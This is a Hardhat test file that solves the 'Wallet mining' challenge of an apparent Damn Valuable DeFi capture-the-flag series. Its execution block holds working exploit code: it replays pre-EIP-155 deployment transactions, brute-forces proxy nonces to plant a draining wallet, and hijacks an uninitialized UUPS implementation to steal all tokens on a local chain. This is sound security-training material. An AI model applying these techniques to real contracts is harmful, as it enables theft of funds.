const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');
const { firstTx, secondTx, createFactoryTx } = require("./deployment.json");

describe('[Challenge] Wallet mining', function () {
    let deployer, player;
    let token, authorizer, walletDeployer;
    let initialWalletDeployerTokenBalance;
    
    const DEPOSIT_ADDRESS = '0x9b6fb606a9f5789444c17768c6dfcf2f83563801';
    const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [ deployer, ward, player ] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy authorizer with the corresponding proxy
        authorizer = await upgrades.deployProxy(
            await ethers.getContractFactory('AuthorizerUpgradeable', deployer),
            [ [ ward.address ], [ DEPOSIT_ADDRESS ] ], // initialization data
            { kind: 'uups', initializer: 'init' }
        );

        expect(await authorizer.owner()).to.eq(deployer.address);
        expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
        expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;

        // Deploy Safe Deployer contract
        walletDeployer = await (await ethers.getContractFactory('WalletDeployer', deployer)).deploy(
            token.address
        );
        expect(await walletDeployer.chief()).to.eq(deployer.address);
        expect(await walletDeployer.gem()).to.eq(token.address);

        // Set Authorizer in Safe Deployer
        await walletDeployer.rule(authorizer.address);
        expect(await walletDeployer.mom()).to.eq(authorizer.address);

        await expect(walletDeployer.can(ward.address, DEPOSIT_ADDRESS)).not.to.be.reverted;
        await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.be.reverted;

        // Fund Safe Deployer with tokens
        initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
        await token.transfer(
            walletDeployer.address,
            initialWalletDeployerTokenBalance
        );

        // Ensure these accounts start empty
        expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.fact())).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.copy())).to.eq('0x');

        // Deposit large amount of DVT tokens to the deposit address
        await token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Ensure initial balances are set correctly
        expect(await token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
        expect(await token.balanceOf(walletDeployer.address)).eq(
            initialWalletDeployerTokenBalance
        );
        expect(await token.balanceOf(player.address)).eq(0);
    });

    it('Execution', async function () {
        // First, find the deployer who deployed the ProxyFactory and MasterCopy (do this on etherscan) - `0x1aa7451dd11b8cb16ac089ed7fe05efa00100a6a`.
        // - https://etherscan.io/tx/0x75a42f240d229518979199f56cd7c82e4fc1f1a20ad9a4864c635354b4a34261
        // - https://etherscan.io/tx/0x06d2fa464546e99d2147e1fc997ddb624cec9c8c5e25a050cc381ee8a384eed3

        // Then, we can find the deployment of MasterCopy and ProxyFactory is the 1st and 3rd transaction of the deployer.
        // - https://etherscan.io/txs?a=0x1aa7451dd11b8cb16ac089ed7fe05efa00100a6a

        // Finally, since the transactions are done BEFORE EIP-155, it does not contain chainId information in the transaction data, which means we can perform
        // a replay attack on our local chain.
        const deployer = `0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A`;
        await player.sendTransaction({
          from: player.address,
          to: deployer,
          value: ethers.utils.parseEther("1"),
        });

        // Mock the first 2 transactions of deployer, and deploy the `GnosisSafeProxyFactory` which should have the address of `0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B`.
        await ethers.provider.sendTransaction(firstTx);
        await ethers.provider.sendTransaction(secondTx);
        const txReceipt = await (await ethers.provider.sendTransaction(createFactoryTx)).wait();
        const proxyFactory = (await ethers.getContractFactory("GnosisSafeProxyFactory")).attach(txReceipt.contractAddress);
        expect(txReceipt.contractAddress).to.be.equal(`0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B`);

        // Calculate the nonce of the deployment of `GnosisSafeProxyFactory`. Since it uses `create`, we can bruteforce the nonce.
        // nonce == 43.
        // for (let i = 1; i < 50; i++) {
        //   const addr = ethers.utils.getContractAddress({
        //   from: "0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B",
        //   nonce: i,
        // });
        // if (addr == "0x9B6fb606A9f5789444c17768c6dFCF2f83563801") {
        //   console.log("Deposit deployment nonce", i);
        // }
        // }

        // Deploy mockWallet to drain funds from `DEPOSIT_ADDRESS`.
        const mockWalletFactory = await ethers.getContractFactory("MockWallet");
        const mockWallet = await mockWalletFactory.deploy();
        for (let i = 1; i <= 42; i++) {
            await proxyFactory.createProxy(mockWallet.address, []);
        }
        const payload = mockWalletFactory.interface.encodeFunctionData("attack", [
            token.address,
            player.address,
        ]);
        await proxyFactory.createProxy(mockWallet.address, payload);

        // UUPSUpgradable Implementation Slot: 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
        const implementationSlot = await ethers.provider.getStorageAt(authorizer.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc');
        const implementationAddr = `0x` + implementationSlot.slice(-40);

        // Connect `AuthorizerUpgradeable` to be its owner.
        const authorizerUpgradeable = (await ethers.getContractFactory("AuthorizerUpgradeable")).attach(implementationAddr);
        await authorizerUpgradeable.connect(player).init([], []);

        // Deploy `FakeAuthorizer` for upgrade.
        const fakeAuthorizerFactory = (await ethers.getContractFactory("FakeAuthorizer"));
        const fakeAuthorizer = await fakeAuthorizerFactory.deploy();

        // Upgrade the `AuthorizerUpgradeable`'s logic contract to our `FakeAuthorizer`.
        await authorizerUpgradeable
          .connect(player)
          .upgradeToAndCall(fakeAuthorizer.address, fakeAuthorizerFactory.interface.encodeFunctionData("attack", []));

        // The `can()` function on `walletDeployer` should be true by now.
        expect(await walletDeployer.can(player.address,DEPOSIT_ADDRESS)).to.be.true;

        // Run `drop()` 43 times to drain all of `walletDeployer` tokens.
        for (let i = 0; i < 43; i++) {
            await walletDeployer.connect(player).drop([]);
        }

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Factory account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.fact())
        ).to.not.eq('0x');

        // Master copy account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.copy())
        ).to.not.eq('0x');

        // Deposit account must have code
        expect(
            await ethers.provider.getCode(DEPOSIT_ADDRESS)
        ).to.not.eq('0x');
        
        // The deposit address and the Safe Deployer contract must not hold tokens
        expect(
            await token.balanceOf(DEPOSIT_ADDRESS)
        ).to.eq(0);
        expect(
            await token.balanceOf(walletDeployer.address)
        ).to.eq(0);

        // Player must own all tokens
        expect(
            await token.balanceOf(player.address)
        ).to.eq(initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT)); 
    });
});
